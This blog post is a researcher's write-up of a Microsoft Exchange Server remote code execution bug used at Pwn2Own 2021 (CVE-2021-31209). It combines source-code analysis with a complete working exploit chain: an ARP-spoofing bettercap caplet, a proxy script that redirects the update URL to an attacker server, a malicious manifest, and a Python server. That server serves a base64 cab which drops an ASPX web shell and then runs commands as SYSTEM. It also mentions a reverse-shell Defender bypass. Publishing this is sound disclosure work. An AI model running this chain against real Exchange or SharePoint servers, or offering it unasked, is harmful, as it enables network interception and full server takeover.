---
layout: post
title: "Pwn2Own Vancouver 2021 :: Microsoft Exchange Server Remote Code Execution"
date: 2021-08-25 09:00:00 -0500
categories: blog
---

![Exchange Online](/assets/images/pwn2own-2021/exchange-logo.png "Exchange On-premise")

In mid-November 2020 I discovered a logical remote code execution vulnerability in Microsoft Exchange Server that had a bizarre twist - it required a [morpheus in the middle](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) (MiTM) attack to take place before it could be triggered. I found this bug because I was looking for calls to `WebClient.DownloadFile` in the hope to discover a server-side request forgery vulnerability since in some environments within exchange server, that type of vulnerability [can have drastic impact](https://github.com/SecureAuthCorp/impacket/pull/857). Later, I found out that [SharePoint Server](https://www.zerodayinitiative.com/advisories/ZDI-21-829/) was also affected by essentially the same code pattern.
<!--more-->

TL; DR; *This post is a quick breakdown of the vulnerability I used at Pwn2Own Vancouver 2021 to partially win the entry for Microsoft Exchange Server.*

## Vulnerability Summary

An unauthenticated attacker in a privileged network position such as MiTM attack can trigger a remote code execution vulnerability when an administrative user runs the `Update-ExchangeHelp` or `Update-ExchangeHelp -Force`command in the Exchange Management Shell.

## Vulnerability Analysis

Inside of the `Microsoft.Exchange.Management.dll` file the `Microsoft.Exchange.Management.UpdatableHelp.UpdatableExchangeHelpCommand` class is defined:

```cs
protected override void InternalProcessRecord()
{
    TaskLogger.LogEnter();
    UpdatableExchangeHelpSystemException ex = null;
    try
    {
        ex = this.helpUpdater.UpdateHelp();    // 1
    }
    //...
```

At *[1]* the code calls the `HelpUpdater.UpdateHelp` method. Inside of the `Microsoft.Exchange.Management.UpdatableHelp.HelpUpdater` class we see:

```cs
internal UpdatableExchangeHelpSystemException UpdateHelp()
{
    double num = 90.0;
    UpdatableExchangeHelpSystemException result = null;
    this.ProgressNumerator = 0.0;
    if (this.Cmdlet.Force || this.DownloadThrottleExpired())
    {
        try
        {
            this.UpdateProgress(UpdatePhase.Checking, LocalizedString.Empty, (int)this.ProgressNumerator, 100);
            string path = this.LocalTempBase + "UpdateHelp.$$$\\";
            this.CleanDirectory(path);
            this.EnsureDirectory(path);
            HelpDownloader helpDownloader = new HelpDownloader(this);
            helpDownloader.DownloadManifest();    // 2
```

This function performs a few actions. The first is at *[2]* when `DownloadManifest` is called. Let's take a look at `Microsoft.Exchange.Management.UpdatableHelp.HelpDownloader.DownloadManifest`:

```cs
internal void DownloadManifest()
{
    string downloadUrl = this.ResolveUri(this.helpUpdater.ManifestUrl);
    if (!this.helpUpdater.Cmdlet.Abort)
    {
        this.AsyncDownloadFile(UpdatableHelpStrings.UpdateComponentManifest, downloadUrl, this.helpUpdater.LocalManifestPath, 30000, new DownloadProgressChangedEventHandler(this.OnManifestProgressChanged), new AsyncCompletedEventHandler(this.OnManifestDownloadCompleted));  // 3
    }
}
```

At *[3]* the code is calling `AsyncDownloadFile` using a the `ManifestUrl`. The `ManifestUrl` is set when the `LoadConfiguration` method is called from `InternalValidate`:

```cs
protected override void InternalValidate()
{
    TaskLogger.LogEnter();
    UpdatableExchangeHelpSystemException ex = null;
    try
    {
        this.helpUpdater.LoadConfiguration();   // 4
    }
```

```cs
internal void LoadConfiguration()
{
    //...
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\ExchangeServer\\v15\\UpdateExchangeHelp");
    if (registryKey3 == null)
    {
        registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\ExchangeServer\\v15\\UpdateExchangeHelp");
    }
    if (registryKey3 != null)
	{
        try
		{
            this.ManifestUrl = registryKey3.GetValue("ManifestUrl", "http://go.microsoft.com/fwlink/p/?LinkId=287244").ToString();  // 5
```

At *[4]* the code calls `LoadConfiguration` during the validation of the arguments to the cmdlet. This sets the `ManifestUrl` to `http://go.microsoft.com/fwlink/p/?LinkId=287244` if it does not exist in the registry hive: `HKLM\SOFTWARE\Microsoft\ExchangeServer\v15\UpdateExchangeHelp` at *[5]*. By default, it does not so the value is always `http://go.microsoft.com/fwlink/p/?LinkId=287244`.

Back to `AsyncDownloadFile` at *[3]* this method will use the `WebClient.DownloadFileAsync` API to download a file onto the filesystem. Since we cannot control the local file path, there is no vuln here. Later in `UpdateHelp`, we see the following code:

```cs
//...
if (!this.Cmdlet.Abort)
{
    UpdatableHelpVersionRange updatableHelpVersionRange = helpDownloader.SearchManifestForApplicableUpdates(this.CurrentHelpVersion, this.CurrentHelpRevision); // 6
    if (updatableHelpVersionRange != null)
    {
        double num2 = 20.0;
        this.ProgressNumerator = 10.0;
        this.UpdateProgress(UpdatePhase.Downloading, LocalizedString.Empty, (int)this.ProgressNumerator, 100);
        string[] array = this.EnumerateAffectedCultures(updatableHelpVersionRange.CulturesAffected);
        if (array.Length != 0)  // 7
        {
            this.Cmdlet.WriteVerbose(UpdatableHelpStrings.UpdateApplyingRevision(updatableHelpVersionRange.HelpRevision, string.Join(", ", array)));
            helpDownloader.DownloadPackage(updatableHelpVersionRange.CabinetUrl);  // 8
            if (this.Cmdlet.Abort)
            {
                return result;
            }
            this.ProgressNumerator += num2;
            this.UpdateProgress(UpdatePhase.Extracting, LocalizedString.Empty, (int)this.ProgressNumerator, 100);
            HelpInstaller helpInstaller = new HelpInstaller(this, array, num);
            helpInstaller.ExtractToTemp();  // 9
            //...
```

There is a lot to unpack here (excuse the pun). At *[6]* the code searches through the downloaded manifest file for a specific version or version range and ensures that the version of Exchange server falls within that range. The check also ensures that the new revision number is higher than the current revision number. If these requirements are satisfied, the code then proceeds to *[7]* where the culture is checked. Since I was targeting the English language pack, I set this to `en` so that a valid path can be later constructed. Then at *[8]* the `CabinetUrl` is downloaded and stored. This is a .cab file specified in the xml manifest file.

Finally at *[9]* the cab file is extracted using `Microsoft.Exchange.Management.UpdatableHelp.HelpInstaller.ExtractToTemp` method:

```cs
internal int ExtractToTemp()
{
    this.filesAffected = 0;
    this.helpUpdater.EnsureDirectory(this.helpUpdater.LocalCabinetExtractionTargetPath);
    this.helpUpdater.CleanDirectory(this.helpUpdater.LocalCabinetExtractionTargetPath);
    bool embedded = false;
    string filter = "";
    int result = EmbeddedCabWrapper.ExtractCabFiles(this.helpUpdater.LocalCabinetPath, this.helpUpdater.LocalCabinetExtractionTargetPath, filter, embedded);   // 10
    this.cabinetFiles = new Dictionary<string, List<string>>();
    this.helpUpdater.RecursiveDescent(0, this.helpUpdater.LocalCabinetExtractionTargetPath, string.Empty, this.affectedCultures, false, this.cabinetFiles);
    this.filesAffected = result;
    return result;
}
```

At [10] the code calls `Microsoft.Exchange.CabUtility.EmbeddedCabWrapper.ExtractCabFiles` from the `Microsoft.Exchange.CabUtility.dll` which is a mix mode assembly containing native code to extract cab files with the exported function `ExtractCab`. Unfortunately, this parser does not register a callback function before extraction to verify files do not contain a directory traversal. This allowed me to write arbitrary files to arbitrary locations.

## Exploitation

A file write vulnerability does not necessarily mean remote code execution, but in the context of web applications it quite often does. The attack I presented at Pwn2Own wrote to the `C:/inetpub/wwwroot/aspnet_client` directory and that allowed me to make a http request for the shell to execute arbitrary code as SYSTEM without authentication.

Let us review the setup so we can visualize the attack.

### Setup

The first step will require you to perform an ARP spoof against the target system. For this stage I choose to use [bettercap](https://www.bettercap.org/), which allows you to define caplets that can automate itself. I think the last time I did a targeted MiTM attack was about *12* years ago! Here is the contents of my `poc.cap` file which sets up the ARP spoof and a proxy script to intercept and respond to specific http requests:

```
set http.proxy.script poc.js
http.proxy on
set arp.spoof.targets 192.168.0.142
events.stream off
arp.spoof on
```

The `poc.js` file is the proxy script that I wrote to intercept the targets request and redirect it to the attackers hosted configuration file at `http://192.168.0.56:8000/poc.xml`.

```js
function onLoad() {
    log_info("Exchange Server CabUtility ExtractCab Directory Traversal Remote Code Execution Vulnerability")
    log_info("Found by Steven Seeley of Source Incite")
}

function onRequest(req, res) {
    log_info("(+) triggering mitm");
    var uri = req.Scheme + "://" +req.Hostname + req.Path + "?" + req.Query;
    if (uri === "http://go.microsoft.com/fwlink/p/?LinkId=287244"){
        res.Status = 302;
        res.SetHeader("Location", "http://192.168.0.56:8000/poc.xml");
    }
}
```

This `poc.xml` manifest file contains the `CabinetUrl` hosting the malicious cab file along with the `Version` range that the update is targeting:

```xml
<ExchangeHelpInfo>
  <HelpVersions>
    <HelpVersion>
      <Version>15.2.1.1-15.2.999.9</Version>
      <Revision>1</Revision>
      <CulturesUpdated>en</CulturesUpdated>
      <CabinetUrl>http://192.168.0.56:8000/poc.cab</CabinetUrl>
    </HelpVersion>
  </HelpVersions>
</ExchangeHelpInfo>
```

I packaged up the manifest and `poc.cab` file delivery process into a small little python http server, `poc.py` that will also attempt access to the `poc.aspx` file with a command to be executed as SYSTEM:

```py
import sys
import base64
import urllib3
import requests
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CabRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def do_GET(self):
        if self.path.endswith("poc.xml"):
            print("(+) delivering xml file...")
            xml = """<ExchangeHelpInfo>
  <HelpVersions>
    <HelpVersion>
      <Version>15.2.1.1-15.2.999.9</Version>
      <Revision>%s</Revision>
      <CulturesUpdated>en</CulturesUpdated>
      <CabinetUrl>http://%s:8000/poc.cab</CabinetUrl>
    </HelpVersion>
  </HelpVersions>
</ExchangeHelpInfo>""" % (r, s)
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml')
            self.send_header("Content-Length", len(xml))
            self.end_headers()
            self.wfile.write(str.encode(xml))
        elif self.path.endswith("poc.cab"):
            print("(+) delivering cab file...")
            # created like: makecab /d "CabinetName1=poc.cab" /f files.txt
            # files.txt contains: "poc.aspx" "../../../../../../../inetpub/wwwroot/aspnet_client/poc.aspx"
            # poc.aspx contains: <%=System.Diagnostics.Process.Start("cmd", Request["c"])%> 
            stage_2  = "TVNDRgAAAAC+AAAAAAAAACwAAAAAAAAAAwEBAAEAAAAPEwAAeAAAAAEAAQA6AAAA"
            stage_2 += "AAAAAAAAZFFsJyAALi4vLi4vLi4vLi4vLi4vLi4vLi4vaW5ldHB1Yi93d3dyb290"
            stage_2 += "L2FzcG5ldF9jbGllbnQvcG9jLmFzcHgARzNy0T4AOgBDS7NRtQ2uLC5JzdVzyUxM"
            stage_2 += "z8svLslMLtYLKMpPTi0u1gsuSSwq0VBKzk1R0lEISi0sTS0uiVZKVorVVLUDAA=="
            p = base64.b64decode(stage_2.encode('utf-8'))
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-cab')
            self.send_header("Content-Length", len(p))
            self.end_headers()
            self.wfile.write(p)
            return

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("(+) usage: %s <target> <connectback> <revision> <cmd>" % sys.argv[0])
        print("(+) eg: %s 192.168.0.142 192.168.0.56 1337 mspaint" % sys.argv[0])
        print("(+) eg: %s 192.168.0.142 192.168.0.56 1337 \"whoami > c:/poc.txt\"" % sys.argv[0])
        sys.exit(-1)
    t = sys.argv[1]
    s = sys.argv[2]
    port = 8000
    r = sys.argv[3]
    c = sys.argv[4]
    print("(+) server bound to port %d" % port)
    print("(+) targeting: %s using cmd: %s" % (t, c))
    httpd = HTTPServer(('0.0.0.0', int(port)), CabRequestHandler)
    handlerthr = Thread(target=httpd.serve_forever, args=())
    handlerthr.daemon = True
    handlerthr.start()
    p = { "c" : "/c %s" % c }
    try:
        while 1:
            req = requests.get("https://%s/aspnet_client/poc.aspx" % t, params=p, verify=False)
            if req.status_code == 200:
                break
        print("(+) executed %s as SYSTEM!" % c)
    except KeyboardInterrupt:
        pass
```

On each attack attempt, the `Revision` number needs to be increased because the code will write the value into the registry and after downloading the manifest file, will verify that the file contains a higher `Revision` number before proceeding to download and extract the cab file.

### Bypassing Windows Defender

Executing `mspaint` is kool and all, but for Pwn2Own we needed a Defender bypass to `pop thy shell`. After [Orange Tsai](https://twitter.com/orange_8361) dropped the details of his [ProxyLogin](https://proxylogon.com/) exploit, Microsoft decided to attempt to detect asp.net web shells. So I took a different route than Orange by compiling a custom binary that executed a reverse shell and dropping it onto disk and executing it to side step Defender.

### Example Attack

We start by running Bettercap with the `poc.cap` caplet file:

```
researcher@pluto:~/poc-exchange$ sudo bettercap -caplet poc.cap
bettercap v2.28 (built for linux amd64 with go1.13.12) [type 'help' for a list of commands]

[12:23:13] [sys.log] [inf] Exchange Server CabUtility ExtractCab Directory Traversal Remote Code Execution Vulnerability
[12:23:13] [sys.log] [inf] Found by Steven Seeley of Source Incite
[12:23:13] [sys.log] [inf] http.proxy enabling forwarding.
[12:23:13] [sys.log] [inf] http.proxy started on 192.168.0.56:8080 (sslstrip disabled)
```

Now we ping the target (to update the targets cached Arp table) and run the `poc.py` and wait for an administrative user to run `Update-ExchangeHelp` or `Update-ExchangeHelp -Force` in the Exchange Management Console (EMC) (`-Force` is required if the `Update-ExchangeHelp` command has been ran within the last 24 hours):

```
researcher@pluto:~/poc-exchange$ ./poc.py 
(+) usage: ./poc.py <target> <connectback> <revision> <cmd>
(+) eg: ./poc.py 192.168.0.142 192.168.0.56 1337 mspaint
(+) eg: ./poc.py 192.168.0.142 192.168.0.56 1337 "whoami > c:/poc.txt"

researcher@pluto:~/poc-exchange$ ./poc.py 192.168.0.142 192.168.0.56 1337 mspaint
(+) server bound to port 8000
(+) targeting: 192.168.0.142 using cmd: mspaint
(+) delivering xml file...
(+) delivering cab file...
(+) executed mspaint as SYSTEM!
```

<iframe src="https://player.vimeo.com/video/503200167" width="640" height="360" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen></iframe>

---

## Conclusion

It's not the first time that a [MiTM attack has been used at Pwn2Own](https://www.zerodayinitiative.com/advisories/ZDI-20-705/) and it was nice to find a vulnerability that had no collision with other researchers at the competition. This was only possible by finding a new vector and/or surface to hunt vulnerabilities in within Exchange Server. Logical vulnerabilities are always interesting because it almost always means that exploitation is given, and those same issues are very hard to discover with traditional automated tools. It is argued that all web vulns are in fact, logical in nature. Even web-based injection vulns, since they require no manipulation of memory, and the attack can be repeated ad hoc.

The impact of this vulnerability in Exchange server is quite high since the EMC connects via PS-Remoting to the IIS service which is configured to run as SYSTEM. This is not the case for SharePoint Server where the SharePoint Management Shell (SMS) is directly impacted, achieving code execution as the user running the SMS.

Microsoft patched this issue as [CVE-2021-31209](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31209) and we recommend you deploy the patch immediately if you have not done so already.

## References

- [https://www.zerodayinitiative.com/advisories/ZDI-21-615/](https://www.zerodayinitiative.com/advisories/ZDI-21-615/)
- [https://www.zerodayinitiative.com/advisories/ZDI-21-826/](https://www.zerodayinitiative.com/advisories/ZDI-21-826/)
